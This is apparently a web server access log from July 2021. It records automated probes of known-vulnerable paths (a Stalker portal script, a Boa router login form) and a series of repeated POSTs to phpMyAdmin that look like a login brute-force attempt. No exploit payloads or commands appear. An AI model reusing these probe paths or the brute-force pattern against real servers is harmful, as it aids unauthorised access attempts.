180.149.125.175 - - [31/Jul/2021:21:04:27 +0900] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 404 1808 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
175.197.178.105 - - [31/Jul/2021:21:15:45 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2931 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
175.197.178.105 - - [31/Jul/2021:21:29:02 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2938 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
104.140.188.6 - - [31/Jul/2021:21:32:57 +0900] "GET / HTTP/1.1" 200 3573 "-" "https://gdnplus.com:Gather Analyze Provide."
175.197.178.105 - - [31/Jul/2021:21:42:06 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2939 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
114.204.112.248 - - [31/Jul/2021:21:53:57 +0900] "GET / HTTP/1.1" 400 0 "-" "-"
209.141.50.63 - - [31/Jul/2021:21:53:57 +0900] "POST /boaform/admin/formLogin HTTP/1.1" 404 1808 "http://49.50.163.238:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
175.197.178.105 - - [31/Jul/2021:21:54:57 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2934 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
175.197.178.105 - - [31/Jul/2021:22:07:35 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2936 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
185.36.81.24 - - [31/Jul/2021:22:09:21 +0900] "GET / HTTP/1.1" 200 1944 "-" "Linux Gnu (cow)"
175.197.178.105 - - [31/Jul/2021:22:20:00 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2931 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
175.197.178.105 - - [31/Jul/2021:22:32:13 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2931 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
175.197.178.105 - - [31/Jul/2021:22:44:14 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2931 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
175.197.178.105 - - [31/Jul/2021:22:56:03 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2934 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
175.197.178.105 - - [31/Jul/2021:23:07:40 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2935 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
175.197.178.105 - - [31/Jul/2021:23:19:05 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2932 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
175.197.178.105 - - [31/Jul/2021:23:30:19 +0900] "POST /phpmyadmin/index.php HTTP/1.1" 200 2926 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
